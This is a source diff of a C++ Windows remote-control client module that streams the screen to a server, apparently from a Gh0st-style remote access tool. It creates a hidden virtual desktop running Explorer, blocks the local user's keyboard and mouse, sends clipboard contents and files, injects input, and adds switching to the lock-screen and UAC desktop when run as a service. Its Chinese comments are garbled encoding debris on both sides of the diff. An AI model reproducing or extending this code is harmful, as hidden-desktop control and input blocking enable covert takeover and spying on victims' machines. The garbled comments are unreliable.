@@ -90,6 +90,8 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CMan
     m_conn = &g_SETTINGS;
     InitFileUpload("");
 #endif
+    m_isGDI = TRUE;
+    m_virtual = FALSE;
     m_bIsWorking = TRUE;
     m_bIsBlockInput = FALSE;
     g_hDesk = nullptr;
@@ -113,7 +115,7 @@ CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CMan
 std::wstring ConvertToWString(const std::string& multiByteStr)
 {
     int len = MultiByteToWideChar(CP_ACP, 0, multiByteStr.c_str(), -1, NULL, 0);
-    if (len == 0) return L""; // ×ª»»Ê§°Ü
+    if (len == 0) return L""; // è½¬æ¢å¤±è´¥
 
     std::wstring wideStr(len, L'\0');
     MultiByteToWideChar(CP_ACP, 0, multiByteStr.c_str(), -1, &wideStr[0], len);
@@ -163,7 +165,7 @@ bool LaunchApplication(TCHAR* pszApplicationFilePath, TCHAR* pszDesktopName)
 
         if (pszError) {
             Mprintf("CreateProcess [%s] failed: %s\n", pszApplicationFilePath, pszError);
-            LocalFree(pszError);  // ÊÍ·ÅÄÚ´æ
+            LocalFree(pszError);  // é‡Šæ”¾å†…å­˜
         }
 
         if (bCreateProcessReturn)
@@ -195,37 +197,47 @@ void CScreenManager::InitScreenSpy()
     }
     Mprintf("CScreenManager: Type %d Algorithm: %d\n", DXGI, int(algo));
     if (DXGI == USING_VIRTUAL) {
+        m_virtual = TRUE;
         HDESK hDesk = SelectDesktop((char*)m_DesktopID.c_str());
         if (!hDesk) {
             if (hDesk = CreateDesktop(m_DesktopID.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL)) {
-                Mprintf("´´½¨ĞéÄâÆÁÄ»³É¹¦: %s\n", m_DesktopID.c_str());
+                Mprintf("åˆ›å»ºè™šæ‹Ÿå±å¹•æˆåŠŸ: %s\n", m_DesktopID.c_str());
                 TCHAR szExplorerFile[MAX_PATH * 2] = { 0 };
                 GetWindowsDirectory(szExplorerFile, MAX_PATH * 2 - 1);
                 strcat_s(szExplorerFile, MAX_PATH * 2 - 1, "\\Explorer.Exe");
                 if (!LaunchApplication(szExplorerFile, (char*)m_DesktopID.c_str())) {
-                    Mprintf("Æô¶¯×ÊÔ´¹ÜÀíÆ÷Ê§°Ü[%s]!!!\n", m_DesktopID.c_str());
+                    Mprintf("å¯åŠ¨èµ„æºç®¡ç†å™¨å¤±è´¥[%s]!!!\n", m_DesktopID.c_str());
                 }
             } else {
-                Mprintf("´´½¨ĞéÄâÆÁÄ»Ê§°Ü: %s\n", m_DesktopID.c_str());
+                Mprintf("åˆ›å»ºè™šæ‹Ÿå±å¹•å¤±è´¥: %s\n", m_DesktopID.c_str());
             }
         } else {
-            Mprintf("´ò¿ªĞéÄâÆÁÄ»³É¹¦: %s\n", m_DesktopID.c_str());
+            Mprintf("æ‰“å¼€è™šæ‹Ÿå±å¹•æˆåŠŸ: %s\n", m_DesktopID.c_str());
         }
         if (hDesk) {
             SetThreadDesktop(g_hDesk = hDesk);
         }
     }
+    else {
+        HDESK hDesk = OpenActiveDesktop();
+		if (hDesk) {
+			SetThreadDesktop(g_hDesk = hDesk);
+		}
+    }
 
     if ((USING_DXGI == DXGI && IsWindows8orHigher())) {
+        m_isGDI = FALSE;
         auto s = new ScreenCapturerDXGI(algo, DEFAULT_GOP, all);
         if (s->IsInitSucceed()) {
             m_ScreenSpyObject = s;
         } else {
             SAFE_DELETE(s);
+            m_isGDI = TRUE;
             m_ScreenSpyObject = new CScreenSpy(32, algo, FALSE, DEFAULT_GOP, all);
             Mprintf("CScreenManager: DXGI SPY init failed!!! Using GDI instead.\n");
         }
     } else {
+        m_isGDI = TRUE;
         m_ScreenSpyObject = new CScreenSpy(32, algo, DXGI == USING_VIRTUAL, DEFAULT_GOP, all);
     }
 }
@@ -236,36 +248,56 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 
     This->InitScreenSpy();
 
-    This->SendBitMapInfo(); //·¢ËÍbmpÎ»Í¼½á¹¹
+    This->SendBitMapInfo(); //å‘é€bmpä½å›¾ç»“æ„
 
-    // µÈ¿ØÖÆ¶Ë¶Ô»°¿ò´ò¿ª
+    // ç­‰æ§åˆ¶ç«¯å¯¹è¯æ¡†æ‰“å¼€
     This->WaitForDialogOpen();
 
     clock_t last = clock();
     This->SendFirstScreen();
 #if USING_ZLIB
-    const int fps = 8;// Ö¡ÂÊ
+    const int fps = 8;// å¸§ç‡
 #else
-    const int fps = 8;// Ö¡ÂÊ
+    const int fps = 8;// å¸§ç‡
 #endif
-    const int sleep = 1000 / fps;// ¼ä¸ôÊ±¼ä£¨ms£©
-    int c1 = 0; // Á¬ĞøºÄÊ±³¤µÄ´ÎÊı
-    int c2 = 0; // Á¬ĞøºÄÊ±¶ÌµÄ´ÎÊı
-    float s0 = sleep; // Á½Ö¡Ö®¼ä¸ô£¨ms£©
-    const int frames = fps;	// Ã¿Ãëµ÷ÕûÆÁÄ»·¢ËÍËÙ¶È
-    const float alpha = 1.03; // ¿ØÖÆfpsµÄÒò×Ó
+    const int sleep = 1000 / fps;// é—´éš”æ—¶é—´ï¼ˆmsï¼‰
+    int c1 = 0; // è¿ç»­è€—æ—¶é•¿çš„æ¬¡æ•°
+    int c2 = 0; // è¿ç»­è€—æ—¶çŸ­çš„æ¬¡æ•°
+    float s0 = sleep; // ä¸¤å¸§ä¹‹é—´éš”ï¼ˆmsï¼‰
+    const int frames = fps;	// æ¯ç§’è°ƒæ•´å±å¹•å‘é€é€Ÿåº¦
+    const float alpha = 1.03; // æ§åˆ¶fpsçš„å› å­
+    clock_t last_check = clock();
     timeBeginPeriod(1);
     while (This->m_bIsWorking) {
+        // é™ä½æ¡Œé¢æ£€æŸ¥é¢‘ç‡ï¼Œé¿å…é¢‘ç¹çš„DCé‡ç½®å¯¼è‡´é—ªå±
+        if (This->m_isGDI && This->IsRunAsService() && !This->m_virtual) {
+            auto now = clock();
+            if (now - last_check > 500) {
+                last_check = now;
+
+                // ä½¿ç”¨å…¬å…±å‡½æ•°æ£€æŸ¥å¹¶åˆ‡æ¢æ¡Œé¢ï¼ˆæ— éœ€å†™æƒé™ï¼‰
+                if (SwitchToDesktopIfChanged(This->g_hDesk, 0)) {
+                    // æ¡Œé¢å˜åŒ–æ—¶é‡ç½®å±å¹•æ•è·çš„DC
+                    if (This->m_ScreenSpyObject) {
+                        CScreenSpy* spy = dynamic_cast<CScreenSpy*>(This->m_ScreenSpyObject);
+                        if (spy) {
+                            spy->ResetDesktopDC();
+                        }
+                    }
+                }
+            }
+        }
+
         ULONG ulNextSendLength = 0;
         const char*	szBuffer = This->GetNextScreen(ulNextSendLength);
         if (szBuffer) {
-            s0 = max(s0, 50); // ×î¿ìÃ¿Ãë20Ö¡
+            s0 = max(s0, 50); // æœ€å¿«æ¯ç§’20å¸§
             s0 = min(s0, 1000);
             int span = s0-(clock() - last);
             Sleep(span > 0 ? span : 1);
-            if (span < 0) { // ·¢ËÍÊı¾İºÄÊ±½Ï³¤£¬ÍøÂç½Ï²î»òÊı¾İ½Ï¶à
+            if (span < 0) { // å‘é€æ•°æ®è€—æ—¶è¾ƒé•¿ï¼Œç½‘ç»œè¾ƒå·®æˆ–æ•°æ®è¾ƒå¤š
                 c2 = 0;
-                if (frames == ++c1) { // Á¬ĞøÒ»¶¨´ÎÊıºÄÊ±³¤
+                if (frames == ++c1) { // è¿ç»­ä¸€å®šæ¬¡æ•°è€—æ—¶é•¿
                     s0 = (s0 <= sleep*4) ? s0*alpha : s0;
                     c1 = 0;
 #ifdef _DEBUG
@@ -273,9 +305,9 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
                         Mprintf("[+]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
 #endif
                 }
-            } else if (span > 0) { // ·¢ËÍÊı¾İºÄÊ±±Ès0¶Ì£¬±íÊ¾ÍøÂç½ÏºÃ»òÊı¾İ°ü½ÏĞ¡
+            } else if (span > 0) { // å‘é€æ•°æ®è€—æ—¶æ¯”s0çŸ­ï¼Œè¡¨ç¤ºç½‘ç»œè¾ƒå¥½æˆ–æ•°æ®åŒ…è¾ƒå°
                 c1 = 0;
-                if (frames == ++c2) { // Á¬ĞøÒ»¶¨´ÎÊıºÄÊ±¶Ì
+                if (frames == ++c2) { // è¿ç»­ä¸€å®šæ¬¡æ•°è€—æ—¶çŸ­
                     s0 = (s0 >= sleep/4) ? s0/alpha : s0;
                     c2 = 0;
 #ifdef _DEBUG
@@ -296,14 +328,14 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 
 VOID CScreenManager::SendBitMapInfo()
 {
-    //ÕâÀïµÃµ½bmp½á¹¹µÄ´óĞ¡
+    //è¿™é‡Œå¾—åˆ°bmpç»“æ„çš„å¤§å°
     const ULONG   ulLength = 1 + sizeof(BITMAPINFOHEADER);
     LPBYTE	szBuffer = (LPBYTE)VirtualAlloc(NULL,
                                             ulLength, MEM_COMMIT, PAGE_READWRITE);
     if (szBuffer == NULL)
         return;
     szBuffer[0] = TOKEN_BITMAPINFO;
-    //ÕâÀï½«bmpÎ»Í¼½á¹¹·¢ËÍ³öÈ¥
+    //è¿™é‡Œå°†bmpä½å›¾ç»“æ„å‘é€å‡ºå»
     memcpy(szBuffer + 1, m_ScreenSpyObject->GetBIData(), ulLength - 1);
     HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
     m_ClientObject->Send2Server((char*)szBuffer, ulLength, 0);
@@ -312,7 +344,7 @@ VOID CScreenManager::SendBitMapInfo()
 
 CScreenManager::~CScreenManager()
 {
-    Mprintf("ScreenManager Îö¹¹º¯Êı\n");
+    Mprintf("ScreenManager ææ„å‡½æ•°\n");
     UninitFileUpload();
     m_bIsWorking = FALSE;
 
@@ -332,7 +364,7 @@ void RunFileReceiver(CScreenManager *mgr, const std::string &folder)
     IOCPClient* pClient = new IOCPClient(mgr->g_bExit, true, MaskTypeNone, mgr->m_conn->GetHeaderEncType());
     if (pClient->ConnectServer(mgr->m_ClientObject->ServerIP().c_str(), mgr->m_ClientObject->ServerPort())) {
         pClient->setManagerCallBack(mgr, CManager::DataProcess);
-        // ·¢ËÍÄ¿Â¼²¢×¼±¸½ÓÊÕÎÄ¼ş
+        // å‘é€ç›®å½•å¹¶å‡†å¤‡æ¥æ”¶æ–‡ä»¶
         char cmd[300] = { COMMAND_GET_FILE };
         memcpy(cmd + 1, folder.c_str(), folder.length());
         pClient->Send2Server(cmd, sizeof(cmd));
@@ -379,12 +411,12 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     case COMMAND_SCREEN_CONTROL: {
         BlockInput(false);
         ProcessCommand(szBuffer + 1, ulLength - 1);
-        BlockInput(m_bIsBlockInput);  //ÔÙ»Ö¸´³ÉÓÃ»§µÄÉèÖÃ
+        BlockInput(m_bIsBlockInput);  //å†æ¢å¤æˆç”¨æˆ·çš„è®¾ç½®
 
         break;
     }
-    case COMMAND_SCREEN_BLOCK_INPUT: { //ControlThreadÀïËø¶¨
-        m_bIsBlockInput = *(LPBYTE)&szBuffer[1]; //Êó±ê¼üÅÌµÄËø¶¨
+    case COMMAND_SCREEN_BLOCK_INPUT: { //ControlThreadé‡Œé”å®š
+        m_bIsBlockInput = *(LPBYTE)&szBuffer[1]; //é¼ æ ‡é”®ç›˜çš„é”å®š
 
         BlockInput(m_bIsBlockInput);
 
@@ -425,7 +457,7 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         break;
     }
     case COMMAND_GET_FILE: {
-        // ·¢ËÍÎÄ¼ş
+        // å‘é€æ–‡ä»¶
         auto files = GetClipboardFiles();
         std::string dir = (char*)(szBuffer + 1);
         if (!files.empty() && !dir.empty()) {
@@ -440,7 +472,7 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         break;
     }
     case COMMAND_SEND_FILE: {
-        // ½ÓÊÕÎÄ¼ş
+        // æ¥æ”¶æ–‡ä»¶
         int n = RecvFileChunk((char*)szBuffer, ulLength, m_conn, RecvData, m_hash, m_hmac);
         if (n) {
             Mprintf("RecvFileChunk failed: %d. hash: %s, hmac: %s\n", n, m_hash.c_str(), m_hmac.c_str());
@@ -476,15 +508,15 @@ VOID CScreenManager::UpdateClientClipboard(char *szBuffer, ULONG ulLength)
 
 VOID CScreenManager::SendClientClipboard()
 {
-    if (!::OpenClipboard(NULL))  //´ò¿ª¼ôÇĞ°åÉè±¸
+    if (!::OpenClipboard(NULL))  //æ‰“å¼€å‰ªåˆ‡æ¿è®¾å¤‡
         return;
-    HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //´ú±í×ÅÒ»¸öÄÚ´æ
+    HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //ä»£è¡¨ç€ä¸€ä¸ªå†…å­˜
     if (hGlobal == NULL) {
         ::CloseClipboard();
         return;
     }
     size_t	  iPacketLength = GlobalSize(hGlobal) + 1;
-    char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal); //Ëø¶¨
+    char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal); //é”å®š
     LPBYTE	szBuffer = new BYTE[iPacketLength];
 
 
@@ -526,7 +558,7 @@ VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength
 
 std::string GetTitle(HWND hWnd)
 {
-    char title[256]; // Ô¤Áô»º³åÇø
+    char title[256]; // é¢„ç•™ç¼“å†²åŒº
     GetWindowTextA(hWnd, title, sizeof(title));
     return title;
 }
@@ -534,20 +566,20 @@ std::string GetTitle(HWND hWnd)
 VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
 {
     int msgSize = sizeof(MSG64);
-    if (ulLength % 28 == 0)         // 32Î»¿ØÖÆ¶Ë·¢¹ıÀ´µÄÏûÏ¢
+    if (ulLength % 28 == 0)         // 32ä½æ§åˆ¶ç«¯å‘è¿‡æ¥çš„æ¶ˆæ¯
         msgSize = 28;
-    else if (ulLength % 48 == 0)    // 64Î»¿ØÖÆ¶Ë·¢¹ıÀ´µÄÏûÏ¢
+    else if (ulLength % 48 == 0)    // 64ä½æ§åˆ¶ç«¯å‘è¿‡æ¥çš„æ¶ˆæ¯
         msgSize = 48;
-    else return;                    // Êı¾İ°ü²»ºÏ·¨
+    else return;                    // æ•°æ®åŒ…ä¸åˆæ³•
 
-    // ÃüÁî¸öÊı
+    // å‘½ä»¤ä¸ªæ•°
     ULONG	ulMsgCount = ulLength / msgSize;
 
-    // ´¦Àí¶à¸öÃüÁî
+    // å¤„ç†å¤šä¸ªå‘½ä»¤
     BYTE* ptr = szBuffer;
     MSG32 msg32;
     MSG64 msg64;
-    if (g_hDesk) {
+    if (m_virtual) {
         HWND  hWnd = NULL;
         BOOL  mouseMsg = FALSE;
         POINT lastPointCopy = {};
@@ -575,25 +607,25 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                 lastPointCopy = m_lastPoint;
                 m_lastPoint = m_point;
                 if (msg->message == WM_RBUTTONDOWN) {
-                    // ¼ÇÂ¼ÓÒ¼ü°´ÏÂÊ±µÄ×ø±ê
+                    // è®°å½•å³é”®æŒ‰ä¸‹æ—¶çš„åæ ‡
                     m_rmouseDown = TRUE;
                     m_rclickPoint = msg->pt;
                 } else if (msg->message == WM_RBUTTONUP) {
                     m_rmouseDown = FALSE;
                     m_rclickWnd = WindowFromPoint(m_rclickPoint);
-                    // ¼ì²éÊÇ·ñÎªÏµÍ³²Ëµ¥£¨ÈçÈÎÎñÀ¸£©
+                    // æ£€æŸ¥æ˜¯å¦ä¸ºç³»ç»Ÿèœå•ï¼ˆå¦‚ä»»åŠ¡æ ï¼‰
                     char szClass[256] = {};
                     GetClassNameA(m_rclickWnd, szClass, sizeof(szClass));
                     Mprintf("Right click on '%s' %s[%p]\n", szClass, GetTitle(hWnd).c_str(), hWnd);
                     if (strcmp(szClass, "Shell_TrayWnd") == 0) {
-                        // ´¥·¢ÏµÍ³¼¶ÓÒ¼ü²Ëµ¥£¨ÈÎÎñÀ¸£©
+                        // è§¦å‘ç³»ç»Ÿçº§å³é”®èœå•ï¼ˆä»»åŠ¡æ ï¼‰
                         PostMessage(m_rclickWnd, WM_CONTEXTMENU, (WPARAM)m_rclickWnd,
                                     MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y));
                     } else {
-                        // ÆÕÍ¨´°¿ÚµÄÓÒ¼ü²Ëµ¥
+                        // æ™®é€šçª—å£çš„å³é”®èœå•
                         if (!PostMessage(m_rclickWnd, WM_RBUTTONUP, msg->wParam,
                                          MAKELPARAM(m_rclickPoint.x, m_rclickPoint.y))) {
-                            // ¸½¼Ó£ºÄ£Äâ¼üÅÌ°´ÏÂShift+F10£¨±¸ÓÃ²Ëµ¥´¥·¢·½Ê½£©
+                            // é™„åŠ ï¼šæ¨¡æ‹Ÿé”®ç›˜æŒ‰ä¸‹Shift+F10ï¼ˆå¤‡ç”¨èœå•è§¦å‘æ–¹å¼ï¼‰
                             keybd_event(VK_SHIFT, 0, 0, 0);
                             keybd_event(VK_F10, 0, 0, 0);
                             keybd_event(VK_F10, 0, KEYEVENTF_KEYUP, 0);
@@ -614,17 +646,17 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                         lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, msg->lParam);
                         break;
                     }
-                    case HTCLOSE: {// ¹Ø±Õ´°¿Ú
+                    case HTCLOSE: {// å…³é—­çª—å£
                         PostMessageA(hWnd, WM_CLOSE, 0, 0);
                         Mprintf("Close window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
                         break;
                     }
-                    case HTMINBUTTON: {// ×îĞ¡»¯
+                    case HTMINBUTTON: {// æœ€å°åŒ–
                         PostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                         Mprintf("Minsize window: %s[%p]\n", GetTitle(hWnd).c_str(), hWnd);
                         break;
                     }
-                    case HTMAXBUTTON: {// ×î´ó»¯
+                    case HTMAXBUTTON: {// æœ€å¤§åŒ–
                         WINDOWPLACEMENT windowPlacement;
                         windowPlacement.length = sizeof(windowPlacement);
                         GetWindowPlacement(hWnd, &windowPlacement);
@@ -643,7 +675,7 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                     HWND hStartButton = FindWindowA((PCHAR)"Button", NULL);
                     GetWindowRect(hStartButton, &startButtonRect);
                     if (PtInRect(&startButtonRect, m_point)) {
-                        PostMessageA(hStartButton, BM_CLICK, 0, 0); // Ä£Äâ¿ªÊ¼°´Å¥µã»÷
+                        PostMessageA(hStartButton, BM_CLICK, 0, 0); // æ¨¡æ‹Ÿå¼€å§‹æŒ‰é’®ç‚¹å‡»
                         continue;
                     } else {
                         char windowClass[MAX_PATH] = { 0 };
@@ -744,6 +776,33 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
         }
         return;
     }
+    if (IsRunAsService()) {
+        // è·å–å½“å‰æ´»åŠ¨æ¡Œé¢ï¼ˆå¸¦å†™æƒé™ï¼Œç”¨äºé”å±ç­‰å®‰å…¨æ¡Œé¢ï¼‰
+        // ä½¿ç”¨ç‹¬ç«‹çš„é™æ€å˜é‡é¿å…ä¸WorkThreadProcçš„g_hDeskå¹¶å‘å†²çª
+        static HDESK s_inputDesk = NULL;
+        static clock_t s_lastCheck = 0;
+        static DWORD s_lastThreadId = 0;
+        const int CHECK_INTERVAL = 100; // æ¡Œé¢æ£€æµ‹é—´éš”ï¼ˆmsï¼‰ï¼Œå¿«é€Ÿå“åº”é”å±/UACåˆ‡æ¢
+
+        // é¦–æ¬¡è°ƒç”¨æˆ–å®šæœŸæ£€æµ‹æ¡Œé¢æ˜¯å¦å˜åŒ–ï¼ˆé™ä½é¢‘ç‡ï¼Œé¿å…æ¯æ¬¡è¾“å…¥éƒ½æ£€æµ‹ï¼‰
+        auto now = clock();
+        if (!s_inputDesk || now - s_lastCheck > CHECK_INTERVAL) {
+            s_lastCheck = now;
+            if (SwitchToDesktopIfChanged(s_inputDesk, DESKTOP_WRITEOBJECTS | GENERIC_WRITE)) {
+                // æ¡Œé¢å˜åŒ–æ—¶ï¼Œæ ‡è®°éœ€è¦é‡æ–°è®¾ç½®çº¿ç¨‹æ¡Œé¢
+                s_lastThreadId = 0;
+            }
+        }
+
+        // ç¡®ä¿å½“å‰çº¿ç¨‹åœ¨æ­£ç¡®çš„æ¡Œé¢ä¸Šï¼ˆä»…é¦–æ¬¡æˆ–çº¿ç¨‹å˜åŒ–æ—¶è®¾ç½®ï¼‰
+        if (s_inputDesk) {
+            DWORD currentThreadId = GetCurrentThreadId();
+            if (currentThreadId != s_lastThreadId) {
+                SetThreadDesktop(s_inputDesk);
+                s_lastThreadId = currentThreadId;
+            }
+        }
+    }
     for (int i = 0; i < ulMsgCount; ++i, ptr += msgSize) {
         MSG64* Msg = msgSize == 48 ? (MSG64*)ptr :
                      (MSG64*)msg64.Create(msg32.Create(ptr, msgSize));
@@ -773,7 +832,7 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
             break;
         }
 
-        switch(Msg->message) { //¶Ë¿Ú·¢¼Ó¿ìµİ·Ñ
+        switch(Msg->message) { //ç«¯å£å‘åŠ å¿«é€’è´¹
         case WM_LBUTTONDOWN:
             mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
             break;
@@ -805,13 +864,25 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
                         GET_WHEEL_DELTA_WPARAM(Msg->wParam), 0);
             break;
         case WM_KEYDOWN:
-        case WM_SYSKEYDOWN:
-            keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), 0, 0);
+        case WM_SYSKEYDOWN: {
+            INPUT input = { 0 };
+            input.type = INPUT_KEYBOARD;
+            input.ki.wVk = (WORD)Msg->wParam;
+            input.ki.wScan = MapVirtualKey(Msg->wParam, 0);
+            input.ki.dwFlags = 0;
+            SendInput(1, &input, sizeof(INPUT));
             break;
+        }
         case WM_KEYUP:
-        case WM_SYSKEYUP:
-            keybd_event(Msg->wParam, MapVirtualKey(Msg->wParam, 0), KEYEVENTF_KEYUP, 0);
+        case WM_SYSKEYUP: {
+            INPUT input = { 0 };
+            input.type = INPUT_KEYBOARD;
+            input.ki.wVk = (WORD)Msg->wParam;
+            input.ki.wScan = MapVirtualKey(Msg->wParam, 0);
+            input.ki.dwFlags = KEYEVENTF_KEYUP;
+            SendInput(1, &input, sizeof(INPUT));
             break;
+        }
         default:
             break;
         }
